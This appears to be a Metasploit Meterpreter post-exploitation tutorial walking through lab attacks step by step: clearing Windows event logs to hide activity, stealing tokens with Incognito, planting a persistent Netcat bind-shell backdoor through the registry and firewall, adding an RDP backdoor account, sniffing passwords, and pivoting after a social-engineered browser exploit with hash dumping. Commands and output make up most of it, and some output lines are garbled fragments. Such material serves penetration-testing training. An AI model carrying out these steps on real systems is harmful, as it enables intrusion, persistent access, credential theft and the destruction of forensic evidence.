+Sometimes it’s best to not have your activities logged. Whatever the reason, you may find a circumstance where you need to clear away the windows event logs. Looking at the source for the winenum script, located in ‘scripts/meterpreter’, we can see the way this function works.
+
+::
+
+  def clrevtlgs()
+	evtlogs = [
+		'security',
+		'system',
+		'application',
+		'directory service',
+		'dns server',
+		'file replication service'
+	]
+	print_status("Clearing Event Logs, this will leave and event 517")
+	begin
+		evtlogs.each do |evl|
+			print_status("\tClearing the #{evl} Event Log")
+			log = @client.sys.eventlog.open(evl)
+			log.clear
+			file_local_write(@dest,"Cleared the #{evl} Event Log")
+		end
+		print_status("All Event Logs have been cleared")
+	rescue ::Exception => e
+		print_status("Error clearing Event Log: #{e.class} #{e}")
+
+	end
+ end
+
+Let’s look at a scenario where we need to clear the event log, but instead of using a premade script to do the work for us, we will use the power of the ruby interpreter in Meterpreter to clear the logs on the fly. First, let’s see our Windows ‘System’ event log.
+
+Now, let’s exploit the system and manually clear away the logs. We will model our command off of the winenum script. Running ‘log = client.sys.eventlog.open(‘system’)’ will open up the system log for us.
+
+::
+
+  msf exploit(warftpd_165_user) > exploit
+
+ [*] Handler binding to LHOST 0.0.0.0
+ [*] Started reverse handler
+ [*] Connecting to FTP server 172.16.104.145:21...
+ [*] Connected to target FTP server.
+ [*] Trying target Windows 2000 SP0-SP4 English...
+ [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+ [*] Sending stage (2650 bytes)
+ [*] Sleeping before handling stage...
+ [*] Uploading DLL (75787 bytes)...
+ [*] Upload completed.
+ [*] Meterpreter session 2 opened (172.16.104.130:4444 -> 172.16.104.145:1246)
+
+ meterpreter > irb
+ [*] Starting IRB shell
+ [*] The 'client' variable holds the meterpreter client
+ >> log = client.sys.eventlog.open('system')
+ => #>#:0xb6779424 @client=#>, #>, #
+
+ "windows/browser/facebook_extractiptc"=>#, "windows/antivirus/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
+
+
+Now we’ll see if we can clear out the log by running ‘log.clear’.
+
+>> log.clear
+=> #>#:0xb6779424 @client=#>,
+
+/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
+
+
+Let’s see if it worked.
+
+Success! We could now take this further, and create our own script for clearing away event logs.
+
+
+::
+
+  # Clears Windows Event Logs
+
+
+ evtlogs = [
+        'security',
+        'system',
+        'application',
+        'directory service',
+        'dns server',
+        'file replication service'
+        ]
+ print_line("Clearing Event Logs, this will leave an event 517")
+ evtlogs.each do |evl|
+        print_status("Clearing the #{evl} Event Log")
+        log = client.sys.eventlog.open(evl)
+        log.clear
+ end
+ print_line("All Clear! You are a Ninja!")
+
+
+After writing our script, we place it in /usr/share/metasploit-framework/scripts/meterpreter/. Then, let’s re-exploit the system and see if it works.
+
+::
+
+  msf exploit(warftpd_165_user) > exploit
+
+ [*] Handler binding to LHOST 0.0.0.0
+ [*] Started reverse handler
+ [*] Connecting to FTP server 172.16.104.145:21...
+ [*] Connected to target FTP server.
+ [*] Trying target Windows 2000 SP0-SP4 English...
+ [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+ [*] Sending stage (2650 bytes)
+ [*] Sleeping before handling stage...
+ [*] Uploading DLL (75787 bytes)...
+ [*] Upload completed.
+ [*] Meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1253)
+
+ meterpreter > run clearlogs
+ Clearing Event Logs, this will leave an event 517
+ [*] Clearing the security Event Log
+ [*] Clearing the system Event Log
+ [*] Clearing the application Event Log
+ [*] Clearing the directory service Event Log
+ [*] Clearing the dns server Event Log
+ [*] Clearing the file replication service Event Log
+ All Clear! You are a Ninja!
+ meterpreter > exit
+
+
+And the only event left in the log on the system is the expected 517.
+
+This is the power of Meterpreter. Without much background other than some sample code we have taken from another script, we have created a useful tool to help us cover up our actions.
+
+Fun with Incognito
+=====================
+
+Incognito was originally a stand-alone application that allowed you to impersonate user tokens when successfully compromising a system. This was integrated into Metasploit and ultimately into Meterpreter. You can read more about Incognito and how token stealing works via Luke Jennings original paper.
+
+In a nutshell, tokens are just like web cookies. They are a temporary key that allows you to access the system and network without having to provide credentials each time you access a file. Incognito exploits this the same way cookie stealing works, by replaying that temporary key when asked to authenticate. There are two types of tokens: delegate and impersonate. Delegate tokens are created for ‘interactive’ logons, such as logging into the machine or connecting to it via Remote Desktop. Impersonate tokens are for ‘non-interactive’ sessions, such as attaching a network drive or a domain logon script.
+The other great things about tokens? They persist until a reboot. When a user logs off, their delegate token is reported as an impersonate token, but will still hold all of the rights of a delegate token.
+
+* TIP: File servers are virtual treasure troves of tokens since most file servers are used as network attached drives via domain logon scripts
+
+Once you have a Meterpreter session, you can impersonate valid tokens on the system and become that specific user without ever having to worry about credentials, or for that matter, even hashes. During a penetration test, this is especially useful due to the fact that tokens have the possibility of allowing local and/or domain privilege escalation, enabling you alternate avenues with potentially elevated privileges to multiple systems.
+
+First, let’s load up our favorite exploit, ms08_067_netapi, with a Meterpreter payload. Note that we manually set the target because this particular exploit does not always auto-detect the target properly. Setting it to a known target will ensure the right memory addresses are used for exploitation.
+
+::
+
+  msf > use exploit/windows/smb/ms08_067_netapi
+ msf exploit(ms08_067_netapi) > set RHOST 10.211.55.140
+ RHOST => 10.211.55.140
+ msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
+ PAYLOAD => windows/meterpreter/reverse_tcp
+ msf exploit(ms08_067_netapi) > set LHOST 10.211.55.162
+ LHOST => 10.211.55.162
+ msf exploit(ms08_067_netapi) > set LANG english
+ LANG => english
+ msf exploit(ms08_067_netapi) > show targets
+
+ Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+   1   Windows 2000 Universal
+   2   Windows XP SP0/SP1 Universal
+   3   Windows XP SP2 English (NX)
+   4   Windows XP SP3 English (NX)
+   5   Windows 2003 SP0 Universal
+   6   Windows 2003 SP1 English (NO NX)
+   7   Windows 2003 SP1 English (NX)
+   8   Windows 2003 SP2 English (NO NX)
+   9   Windows 2003 SP2 English (NX)
+   10  Windows XP SP2 Arabic (NX)
+   11  Windows XP SP2 Chinese - Traditional / Taiwan (NX)
+
+
+ msf exploit(ms08_067_netapi) > set TARGET 8
+ target => 8
+ msf exploit(ms08_067_netapi) > exploit
+
+ [*] Handler binding to LHOST 0.0.0.0
+ [*] Started reverse handler
+ [*] Triggering the vulnerability...
+ [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+ [*] Sending stage (2650 bytes)
+ [*] Sleeping before handling stage...
+ [*] Uploading DLL (75787 bytes)...
+ [*] Upload completed.
+ [*] Meterpreter session 1 opened (10.211.55.162:4444 -> 10.211.55.140:1028)
+
+ meterpreter >
+
+
+We now have a Meterpreter console from which we will begin our incognito token attack. Like priv (hashdump and timestomp) and stdapi (upload, download, etc.), incognito is a Meterpreter module. We load the module into our Meterpreter session by executing the ‘use incognito‘ command. Issuing the help command shows us the variety of options we have for incognito and brief descriptions of each option.
+
+::
+
+  meterpreter > use incognito
+ Loading extension incognito...success.
+ meterpreter > help
+
+ Incognito Commands
+ ==================
+
+    Command              Description
+    -------              -----------
+    add_group_user       Attempt to add a user to a global group with all tokens
+    add_localgroup_user  Attempt to add a user to a local group with all tokens
+    add_user             Attempt to add a user with all tokens
+    impersonate_token    Impersonate specified token
+    list_tokens          List tokens available under current user context
+    snarf_hashes         Snarf challenge/response hashes for every token
+
+ meterpreter >
+
+
+What we will need to do first is identify if there are any valid tokens on this system. Depending on the level of access that your exploit provides, you are limited in the tokens you are able to view. When it comes to token stealing, SYSTEM is king. As SYSTEM you are allowed to see and use any token on the box.
+
+* TIP: Administrators don’t have access to all the tokens either, but they do have the ability to migrate to SYSTEM processes, effectively making them SYSTEM and able to see all the tokens available.
+
+::
+
+  meterpreter > list_tokens -u
+
+ Delegation Tokens Available
+ ========================================
+ NT AUTHORITY\LOCAL SERVICE
+ NT AUTHORITY\NETWORK SERVICE
+ NT AUTHORITY\SYSTEM
+ SNEAKS.IN\Administrator
+
+ Impersonation Tokens Available
+ ========================================
+ NT AUTHORITY\ANONYMOUS LOGON
+
+ meterpreter >
+
+
+We see here that there is a valid Administrator token that looks to be of interest. We now need to impersonate this token in order to assume its privileges. When issuing the impersonate_token command, note the two backslashes in “SNEAKS.IN\\ Administrator”. This is required as it causes bugs with just one slash. Note also that after successfully impersonating a token, we check our current userID by executing the getuid command.
+
+
+::
+
+  meterpreter > impersonate_token SNEAKS.IN\\Administrator
+ [+] Delegation token available
+ [+] Successfully impersonated user SNEAKS.IN\Administrator
+ meterpreter > getuid
+ Server username: SNEAKS.IN\Administrator
+ meterpreter >
+
+Next, let’s run a shell as this individual account by running ‘execute -f cmd.exe -i -t‘ from within Meterpreter. The ‘execute -f cmd.exe‘ is telling Metasploit to execute cmd.exe, the -i allows us to interact with the victims PC, and the -t assumes the role we just impersonated through incognito.
+
+
+::
+
+  meterpreter > shell
+ Process 2804 created.
+ Channel 1 created.
+ Microsoft Windows XP [Version 5.1.2600]
+ (C) Copyright 1985-2001 Microsoft Corp.
+
+ C:\WINDOWS\system32> whoami
+ whoami
+ SNEAKS.IN\administrator
+
+ C:\WINDOWS\system32>
+
+
+Interacting with the Registry
+===============================
+
+The Windows registry is a magical place where, with just a few keystrokes, you can render a system virtually unusable. So, be very careful on this next section as mistakes can be painful.
+
+Meterpreter has some very useful functions for registry interaction. Let’s look at the options.
+
+::
+
+  meterpreter > reg
+ Usage: reg [command] [options]
+
+ Interact with the target machine's registry.
+
+ OPTIONS:
+
+    -d   The data to store in the registry value.
+    -h        Help menu.
+    -k   The registry key path (E.g. HKLM\Software\Foo).
+    -r   The remote machine name to connect to (with current process credentials
+    -t   The registry value type (E.g. REG_SZ).
+    -v   The registry value name (E.g. Stuff).
+    -w        Set KEY_WOW64 flag, valid values [32|64].
+ COMMANDS:
+
+    enumkey     Enumerate the supplied registry key [-k ]
+    createkey   Create the supplied registry key  [-k ]
+    deletekey   Delete the supplied registry key  [-k ]
+    queryclass Queries the class of the supplied key [-k ]
+    setval      Set a registry value [-k  -v  -d ]
+    deleteval   Delete the supplied registry value [-k  -v ]
+    queryval    Queries the data contents of a value [-k  -v ]
+
+
+Here we can see there are various options we can use to interact with the remote system. We have the full options of reading, writing, creating, and deleting remote registry entries. These can be used for any number of actions, including remote information gathering. Using the registry, one can find what files have been used, web sites visited in Internet Explorer, programs used, USB devices used, and so on.
+
+There is a great quick reference list of these interesting registry entries published by Access Data, as well as any number of Internet references worth finding when there is something specific you are looking for.
+
+
+Persistent Netcat Backdppr
+^^^^^^^^^^^^^^^^^^^^
+
+In this example, instead of looking up information on the remote system, we will be installing a Netcat backdoor. This includes changes to the system registry and firewall.
+
+First, we must upload a copy of Netcat to the remote system.
+
+::
+
+  meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
+ [*] uploading  : /usr/share/windows-binaries/nc.exe -> C:\windows\system32
+ [*] uploaded   : /usr/share/windows-binaries/nc.exe -> C:\windows\system32nc.exe
+
+Afterwards, we work with the registry to have netcat execute on start up and listen on port 445. We do this by editing the key ‘HKLM\software\microsoft\windows\currentversion\run’.
+
+::
+
+  meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+ Enumerating: HKLM\software\microsoft\windows\currentversion\run
+
+  Values (3):
+
+    VMware Tools
+    VMware User Process
+    quicktftpserver
+
+ meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
+ Successful set nc.
+ meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+ Key: HKLM\software\microsoft\windows\currentversion\Run
+ Name: nc
+ Type: REG_SZ
+ Data: C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe
+
+Next, we need to alter the system to allow remote connections through the firewall to our Netcat backdoor. We open up an interactive command prompt and use the ‘netsh’ command to make the changes as it is far less error-prone than altering the registry directly. Plus, the process shown should work across more versions of Windows, as registry locations and functions are highly version and patch level dependent.
+
+
+::
+
+  meterpreter > execute -f cmd -i
+ Process 1604 created.
+ Channel 1 created.
+ Microsoft Windows XP [Version 5.1.2600]
+ (C) Copyright 1985-2001 Microsoft Corp.
+
+ C:\Documents and Settings\Jim\My Documents > netsh firewall show opmode
+ Netsh firewall show opmode
+
+ Domain profile configuration:
+ -------------------------------------------------------------------
+ Operational mode                  = Enable
+ Exception mode                    = Enable
+
+ Standard profile configuration (current):
+ -------------------------------------------------------------------
+ Operational mode                  = Enable
+ Exception mode                    = Enable
+
+ Local Area Connection firewall configuration:
+ -------------------------------------------------------------------
+ Operational mode                  = Enable
+
+We open up port 445 in the firewall and double-check that it was set properly.
+
+::
+
+  C:\Documents and Settings\Jim\My Documents > netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
+ netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
+ Ok.
+
+ C:\Documents and Settings\Jim\My Documents > netsh firewall show portopening
+ netsh firewall show portopening
+
+ Port configuration for Domain profile:
+ Port   Protocol  Mode     Name
+ -------------------------------------------------------------------
+ 139    TCP       Enable   NetBIOS Session Service
+ 445    TCP       Enable   SMB over TCP
+ 137    UDP       Enable   NetBIOS Name Service
+ 138    UDP       Enable   NetBIOS Datagram Service
+
+ Port configuration for Standard profile:
+ Port   Protocol  Mode     Name
+ -------------------------------------------------------------------
+ 445    TCP       Enable   Service Firewall
+ 139    TCP       Enable   NetBIOS Session Service
+ 445    TCP       Enable   SMB over TCP
+ 137    UDP       Enable   NetBIOS Name Service
+ 138    UDP       Enable   NetBIOS Datagram Service
+
+
+ C:\Documents and Settings\Jim\My Documents >
+
+
+So with that being completed, we will reboot the remote system and test out the Netcat shell.
+
+::
+
+  root@kali:~# nc -v 172.16.104.128 445
+ 172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out
+ (UNKNOWN) [172.16.104.128] 445 (?) open
+ Microsoft Windows XP [Version 5.1.2600]
+ (C) Copyright 1985-2001 Microsoft Corp.
+
+ C:\Documents and Settings\Jim > dir
+ dir
+ Volume in drive C has no label.
+ Volume Serial Number is E423-E726
+
+ Directory of C:\Documents and Settings\Jim
+
+ 05/03/2009 01:43 AM
+ .
+ 05/03/2009 01:43 AM
+ ..
+ 05/03/2009 01:26 AM 0 ;i
+ 05/12/2009 10:53 PM
+ Desktop
+ 10/29/2008 05:55 PM
+ Favorites
+ 05/12/2009 10:53 PM
+ My Documents
+ 05/03/2009 01:43 AM 0 QCY
+ 10/29/2008 03:51 AM
+ Start Menu
+ 05/03/2009 01:25 AM 0 talltelnet.log
+ 05/03/2009 01:25 AM 0 talltftp.log
+ 4 File(s) 0 bytes
+ 6 Dir(s) 35,540,791,296 bytes free
+
+ C:\Documents and Settings\Jim >
+
+
+Wonderful! In a real world situation, we would not be using such a simple backdoor as this, with no authentication or encryption, however the principles of this process remain the same for other changes to the system, and other sorts of programs one might want to execute on start up.
+
+
+Enabling Remote Desktop
+=====================
+
+Let’s look at another situation where Metasploit makes it very easy to backdoor the system using nothing more than built-in system tools. We will utilize Carlos Perez’s ‘getgui’ script, which enables Remote Desktop and creates a user account for you to log into it with. Use of this script could not be easier.
+
+::
+
+  meterpreter > run getgui -h
+ [!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
+ [!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
+ Windows Remote Desktop Enabler Meterpreter Script
+ Usage: getgui -u  -p
+ Or:    getgui -e
+
+ OPTIONS:
+
+    -e        Enable RDP only.
+    -f   Forward RDP Connection.
+    -h        Help menu.
+    -p   The Password of the user to add.
+    -u   The Username of the user to add.
+
+ meterpreter > run getgui -u loneferret -p password
+ [*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+ [*] Carlos Perez carlos_perez@darkoperator.com
+ [*] Language detection started
+ [*] 	Language detected: en_US
+ [*] Setting user account for logon
+ [*] 	Adding User: loneferret with Password: password
+ [*] 	Adding User: loneferret to local group ''
+ [*] 	Adding User: loneferret to local group ''
+ [*] You can now login with the created user
+ [*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
+ meterpreter >
+
+And we are done! That is it. Let’s test the connection to see if it can really be that easy.
+
+And here we see that it is. We used the ‘rdesktop’ command and specified the username and password we want to use for the log in. We then received an error message letting us know a user was already logged into the console of the system, and that if we continue, that user will be disconnected. This is expected behaviour for a Windows XP desktop system, so we can see everything is working as expected. Note that Windows Server allows concurrent graphical logons so you may not encounter this warning message.
+
+Remember, these sorts of changes can be very powerful. However, use that power wisely, as all of these steps alter the systems in ways that can be used by investigators to track what sort of actions were taken on the system. The more changes that are made, the more evidence you leave behind.
+
+When you are done with the current system, you will want to run the cleanup script provided to remove the added account.
+
+::
+
+  meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
+ [*] Running Command List ...
+ [*] 	Running command execute -H -f cmd.exe -a "/c net user hacker /delete"
+ Process 288 created.
+ meterpreter >
+
+
+
+Packet Sniffing
+=============
+
+
+Meterpreter has the capability of packet sniffing the remote host without ever touching the hard disk. This is especially useful if we want to monitor what type of information is being sent, and even better, this is probably the start of multiple auxiliary modules that will ultimately look for sensitive data within the capture files. The sniffer module can store up to 200,000 packets in a ring buffer and exports them in standard PCAP format so you can process them using psnuffle, dsniff, wireshark, etc.
+
+We first fire off our remote exploit toward the victim and gain our standard reverse Meterpreter console.
+
+::
+
+  msf > use exploit/windows/smb/ms08_067_netapi
+ msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpeter/reverse_tcp
+ msf exploit(ms08_067_netapi) > set LHOST 10.211.55.126
+ msf exploit(ms08_067_netapi) > set RHOST 10.10.1.119
+ msf exploit(ms08_067_netapi) > exploit
+
+ [*] Handler binding to LHOST 0.0.0.0
+ [*] Started reverse handler
+ [*] Triggering the vulnerability...
+ [*] Transmitting intermediate stager for over-sized stage...(216 bytes)
+ [*] Sending stage (205824 bytes)
+ [*] Meterpreter session 1 opened (10.10.1.4:4444 -> 10.10.1.119:1921)
+
+
+From here we initiate the sniffer on interface 2 and start collecting packets. We then dump the sniffer output to /tmp/all.cap.
+
+::
+
+  meterpreter > use sniffer
+ Loading extension sniffer...success.
+
+ meterpreter > help
+
+ Sniffer Commands
+ ================
+
+     Command             Description
+     -------             -----------
+     sniffer_dump        Retrieve captured packet data
+     sniffer_interfaces  List all remote sniffable interfaces
+     sniffer_start       Capture packets on a previously opened interface
+     sniffer_stats       View statistics of an active capture
+     sniffer_stop        Stop packet captures on the specified interface
+
+ meterpreter > sniffer_interfaces
+
+ 1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
+ 2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
+ 3 - 'Intel(R) PRO/1000 MT Network Connection' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
+
+ meterpreter > sniffer_start 2
+ [*] Capture started on interface 2 (50000 packet buffer)
+
+ meterpreter > sniffer_dump 2 /tmp/all.cap
+ [*] Dumping packets from interface 2...
+ [*] Wrote 19 packets to PCAP file /tmp/all.cap
+
+ meterpreter > sniffer_stats 2
+ [*] Capture statistics for interface 2
+        packets: 4632
+        bytes: 1978363
+
+ meterpreter > sniffer_dump 2 /tmp/all.cap
+ [*] Flushing packet capture buffer for interface 2...
+ [*] Flushed 5537 packets (3523012 bytes)
+ [*] Downloaded 014% (524288/3523012)...
+ [*] Downloaded 029% (1048576/3523012)...
+ [*] Downloaded 044% (1572864/3523012)...
+ [*] Downloaded 059% (2097152/3523012)...
+ [*] Downloaded 074% (2621440/3523012)...
+ [*] Downloaded 089% (3145728/3523012)...
+ [*] Downloaded 100% (3523012/3523012)...
+ [*] Download completed, converting to PCAP...
+ [-] Corrupted packet data (length:10359)
+ [*] PCAP file written to /tmp/all.cap
+
+ meterpreter > sniffer_stop 2
+ [*] Capture stopped on interface 2
+ [*] There are 279 packets (57849 bytes) remaining
+ [*] Download or release them using 'sniffer_dump' or 'sniffer_release'
+
+ meterpreter > sniffer_release 2
+ [*] Flushed 279 packets (57849 bytes) from interface 2
+ meterpreter >
+
+
+We can now use our favorite parser or packet analysis tool to review the information intercepted.
+
+The Meterpreter packet sniffer uses the MicroOLAP Packet Sniffer SDK and can sniff the packets from the victim machine without ever having to install any drivers or write to the file system. The module is smart enough to realize its own traffic as well and will automatically remove any traffic from the Meterpreter interaction. In addition, Meterpreter pipes all information through an SSL/TLS tunnel and is fully encrypted.
+
+packetrecorder
+^^^^^^^^^^^^^^^^^^
+
+As an alternative to using the sniffer extension, Carlos Perez wrote the packetrecorder Meterpreter script that allows for some more granularity when capturing packets. To see what options are available, we issue the “run packetrecorder” command without any arguments.
+
+::
+
+  meterpreter > run packetrecorder
+ Meterpreter Script for capturing packets in to a PCAP file
+ on a target host given a interface ID.
+
+ OPTIONS:
+
+    -h        Help menu.
+    -i   Interface ID number where all packet capture will be done.
+    -l   Specify and alternate folder to save PCAP file.
+    -li        List interfaces that can be used for capture.
+    -t   Time interval in seconds between recollection of packet, default 30 seconds.
+
+
+Before we start sniffing traffic, we first need to determine which interfaces are available to us.
+
+::
+
+  meterpreter > run packetrecorder -li
+
+ 1 - 'Realtek RTL8139 Family PCI Fast Ethernet NIC' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
+ 2 - 'Citrix XenServer PV Ethernet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
+ 3 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
+
+We will begin sniffing traffic on the second interface, saving the logs to the desktop of our Kali system and let the sniffer run for awhile.
+
+::
+
+  meterpreter > run packetrecorder -i 2 -l /root/
+ [*] Starting Packet capture on interface 2
+ [+] Packet capture started
+ [*] Packets being saved in to /root/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105/XEN-XP-SP2-BARE_20101119.5105.cap
+ [*] Packet capture interval is 30 Seconds
+ ^C
+ [*] Interrupt
+ [+] Stopping Packet sniffer...
+ meterpreter >
+
+There is now a capture file waiting for us that can be analyzed in a tool such as Wireshark or tshark. We will take a quick look to see if we captured anything interesting.
+
+::
+
+  root@kali:~/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105# tshark -r XEN-XP-SP2-BARE_20101119.5105.cap |grep PASS
+ Running as user "root" and group "root". This could be dangerous.
+ 2489  82.000000 192.168.1.201 -> 209.132.183.61 FTP Request: PASS s3cr3t
+ 2685  96.000000 192.168.1.201 -> 209.132.183.61 FTP Request: PASS s3cr3t
+
+
+Pivoting
+============
+
+Pivoting is the unique technique of using an instance (also referred to as a ‘plant’ or ‘foothold’) to be able to “move” around inside a network. Basically using the first compromise to allow and even aid in the compromise of other otherwise inaccessible systems. In this scenario we will be using it for routing traffic from a normally non-routable network.
+
+For example, we are a pentester for Security-R-Us. You pull the company directory and decide to target a user in the target IT department. You call up the user and claim you are from a vendor and would like them to visit your website in order to download a security patch. At the URL you are pointing them to, you are running an Internet Explorer exploit.
+
+::
+
+  msf > use exploit/windows/browser/ms10_002_aurora
+ msf exploit(ms10_002_aurora) > show options
+
+ Module options:
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     0.0.0.0          yes       The local host to listen on.
+   SRVPORT     8080             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+ msf exploit(ms10_002_aurora) > set URIPATH /
+ URIPATH => /
+ msf exploit(ms10_002_aurora) > set PAYLOAD windows/meterpreter/reverse_tcp
+ PAYLOAD => windows/meterpreter/reverse_tcp
+ msf exploit(ms10_002_aurora) > set LHOST 192.168.1.101
+ LHOST => 192.168.1.101
+ msf exploit(ms10_002_aurora) > exploit -j
+ [*] Exploit running as background job.
+
+ [*] Started reverse handler on 192.168.1.101:4444
+ [*] Using URL: http://0.0.0.0:8080/
+ [*]  Local IP: http://192.168.1.101:8080/
+ [*] Server started.
+ msf exploit(ms10_002_aurora) >
+
+
+When the target visits our malicious URL, a meterpreter session is opened for us giving full access the the system.
+
+::
+
+  msf exploit(ms10_002_aurora) >
+ [*] Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.201
+ [*] Sending stage (749056 bytes) to 192.168.1.201
+ [*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.201:8777) at Mon Dec 06 08:22:29 -0700 2010
+
+ msf exploit(ms10_002_aurora) > sessions -l
+
+ Active sessions
+ ===============
+
+  Id  Type                   Information                                      Connection
+  --  ----                   -----------                                      ----------
+  1   meterpreter x86/win32  XEN-XP-SP2-BARE\Administrator @ XEN-XP-SP2-BARE  192.168.1.101:4444 -> 192.168.1.201:8777
+
+ msf exploit(ms10_002_aurora) >
+
+
+When we connect to our meterpreter session, we run ipconfig and see that the exploited system is dual-homed, a common configuration amongst IT staff.
+
+::
+
+  msf exploit(ms10_002_aurora) > sessions -i 1
+ [*] Starting interaction with 1...
+
+ meterpreter > ipconfig
+
+ Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport
+ Hardware MAC: d2:d6:70:fa:de:65
+ IP Address  : 10.1.13.3
+ Netmask     : 255.255.255.0
+
+
+
+ MS TCP Loopback interface
+ Hardware MAC: 00:00:00:00:00:00
+ IP Address  : 127.0.0.1
+ Netmask     : 255.0.0.0
+
+
+
+ Citrix XenServer PV Ethernet Adapter - Packet Scheduler Miniport
+ Hardware MAC: c6:ce:4e:d9:c9:6e
+ IP Address  : 192.168.1.201
+ Netmask     : 255.255.255.0
+
+
+ meterpreter >
+
+
+We want to leverage this newly discovered information and attack this additional network. Metasploit has an autoroute meterpreter script that will allow us to attack this second network through our first compromised machine.
+
+::
+
+  meterpreter > run autoroute -h
+ [*] Usage:   run autoroute [-r] -s subnet -n netmask
+ [*] Examples:
+ [*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
+ [*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
+ [*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
+ [*]   run autoroute -p                            # Print active routing table
+ [*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
+ [*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
+ meterpreter > run autoroute -s 10.1.13.0/24
+ [*] Adding a route to 10.1.13.0/255.255.255.0...
+ [+] Added route to 10.1.13.0/255.255.255.0 via 192.168.1.201
+ [*] Use the -p option to list all active routes
+ meterpreter > run autoroute -p
+
+ Active Routing Table
+ ====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.1.13.0          255.255.255.0      Session 1
+
+ meterpreter >
+
+
+Now that we have added our additional route, we will escalate to SYSTEM, dump the password hashes, and background our meterpreter session by pressing Ctrl-z.
+
+::
+
+  meterpreter > getsystem
+ ...got system (via technique 1).
+ meterpreter > run hashdump
+ [*] Obtaining the boot key...
+ [*] Calculating the hboot key using SYSKEY c2ec80f879c1b5dc8d2b64f1e2c37a45...
+ [*] Obtaining the user list and keys...
+ [*] Decrypting user keys...
+ [*] Dumping password hashes...
+
+
+ Administrator:500:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
+ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ HelpAssistant:1000:9a6ae26408b0629ddc621c90c897b42d:07a59dbe14e2ea9c4792e2f189e2de3a:::
+ SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:ebf9fa44b3204029db5a8a77f5350160:::
+ victim:1004:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
+
+
+ meterpreter >
+ Background session 1? [y/N]
+ msf exploit(ms10_002_aurora) >
+
+Now we need to determine if there are other systems on this second network we have discovered. We will use a basic TCP port scanner to look for ports 139 and 445.
+
+::
+
+  msf exploit(ms10_002_aurora) > use auxiliary/scanner/portscan/tcp
+ msf auxiliary(tcp) > show options
+
+ Module options:
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   CONCURRENCY  10               yes       The number of concurrent ports to check per host
+   FILTER                        no        The filter string for capturing traffic
+   INTERFACE                     no        The name of the interface
+   PCAPFILE                      no        The name of the PCAP capture file to process
+   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
+   RHOSTS                        yes       The target address range or CIDR identifier
+   SNAPLEN      65535            yes       The number of bytes to capture
+   THREADS      1                yes       The number of concurrent threads
+   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
+   VERBOSE      false            no        Display verbose output
+
+ msf auxiliary(tcp) > set RHOSTS 10.1.13.0/24
+ RHOST => 10.1.13.0/24
+ msf auxiliary(tcp) > set PORTS 139,445
+ PORTS => 139,445
+ msf auxiliary(tcp) > set THREADS 50
+ THREADS => 50
+ msf auxiliary(tcp) > run
+
+ [*] 10.1.13.3:139 - TCP OPEN
+ [*] 10.1.13.3:445 - TCP OPEN
+ [*] 10.1.13.2:445 - TCP OPEN
+ [*] 10.1.13.2:139 - TCP OPEN
